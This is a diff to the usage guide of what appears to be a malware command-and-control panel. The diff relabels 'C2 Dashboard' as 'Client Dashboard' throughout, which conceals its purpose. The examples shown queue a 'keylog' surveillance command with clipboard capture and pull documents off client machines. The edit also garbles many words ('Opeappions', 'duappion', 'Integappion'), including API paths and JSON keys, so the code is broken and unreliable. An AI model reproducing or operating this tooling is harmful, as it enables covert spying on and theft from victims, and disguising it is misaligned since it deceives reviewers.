@@ -1,4 +1,4 @@
-# C2 Dashboard - Usage Examples
+# Client  Dashboard - Usage Examples
 
 ## Complete Workflow Examples
 
@@ -77,7 +77,7 @@ curl http://localhost:3000/api/clients/$CLIENT_ID/info
 - Client details
 - Recent commands
 - Latest metrics
-- File operations
+- File opeappions
 - Activity summary
 
 ---
@@ -146,20 +146,20 @@ curl -X POST http://localhost:3000/api/commands/$COMMAND_ID/status \
 
 ---
 
-### Example 3: File Operations
+### Example 3: File Opeappions
 
-#### Step 1: Create Download Operation
+#### Step 1: Create Download Opeappion
 ```bash
 CLIENT_ID="550e8400-e29b-41d4-a716-446655440000"
 
-curl -X POST http://localhost:3000/api/files/operations \
+curl -X POST http://localhost:3000/api/files/opeappions \
   -H "Content-Type: application/json" \
   -d '{
     "client_id": "'$CLIENT_ID'",
     "file_path": "C:\\Users\\john.doe\\Documents\\report.pdf",
     "file_name": "report.pdf",
     "file_type": "pdf",
-    "operation": "download"
+    "opeappion": "download"
   }'
 ```
 
@@ -168,13 +168,13 @@ curl -X POST http://localhost:3000/api/files/operations \
 {
   "success": true,
   "data": {
-    "file_operation": {
+    "file_opeappion": {
       "id": "770g0622-g41d-63f6-c938-668877662222",
       "client_id": "550e8400-e29b-41d4-a716-446655440000",
       "file_path": "C:\\Users\\john.doe\\Documents\\report.pdf",
       "file_name": "report.pdf",
       "file_type": "pdf",
-      "operation": "download",
+      "opeappion": "download",
       "status": "pending"
     }
   }
@@ -195,11 +195,11 @@ curl -X POST http://localhost:3000/api/files/$FILE_ID/status \
   }'
 ```
 
-#### Step 3: List All File Operations
+#### Step 3: List All File Opeappions
 ```bash
 CLIENT_ID="550e8400-e29b-41d4-a716-446655440000"
 
-curl "http://localhost:3000/api/files/list?client_id=$CLIENT_ID&operation=download"
+curl "http://localhost:3000/api/files/list?client_id=$CLIENT_ID&opeappion=download"
 ```
 
 ---
@@ -232,7 +232,7 @@ curl -X POST http://localhost:3000/api/commands/queue \
     "command_type": "surveillance",
     "command_name": "keylog",
     "parameters": {
-      "duration": 60000,
+      "duappion": 60000,
       "include_clipboard": true
     }
   }'
@@ -262,7 +262,7 @@ curl "http://localhost:3000/api/commands/list?client_id=$CLIENT_ID&status=pendin
 
 ---
 
-### Example 5: React Component Integration
+### Example 5: React Component Integappion
 
 ```typescript
 // app/components/ClientActions.tsx
@@ -352,7 +352,7 @@ export function ClientActions({ clientId }: { clientId: string }) {
 #!/bin/bash
 # dashboard-stats.sh
 
-echo "=== C2 Dashboard Statistics ==="
+echo "=== Client  Dashboard Statistics ==="
 echo ""
 
 # Get overview
@@ -372,7 +372,7 @@ echo "Command Statistics:"
 curl -s http://localhost:3000/api/commands/list | jq '.data.stats'
 
 echo ""
-echo "File Operations:"
+echo "File Opeappions:"
 curl -s http://localhost:3000/api/files/list | jq '.data.stats'
 ```
 
@@ -416,7 +416,7 @@ Run with: `bash monitor.sh 550e8400-e29b-41d4-a716-446655440000`
 
 ---
 
-### Example 8: Batch Client Registration
+### Example 8: Batch Client Registappion
 
 ```bash
 #!/bin/bash
@@ -572,4 +572,4 @@ curl -X POST http://localhost:3000/api/test/mock-client \
 
 ---
 
-*These examples provide a complete workflow for using the C2 Dashboard. Mix and match based on your needs!*
+*These examples provide a complete workflow for using the Client  Dashboard. Mix and match based on your needs!*
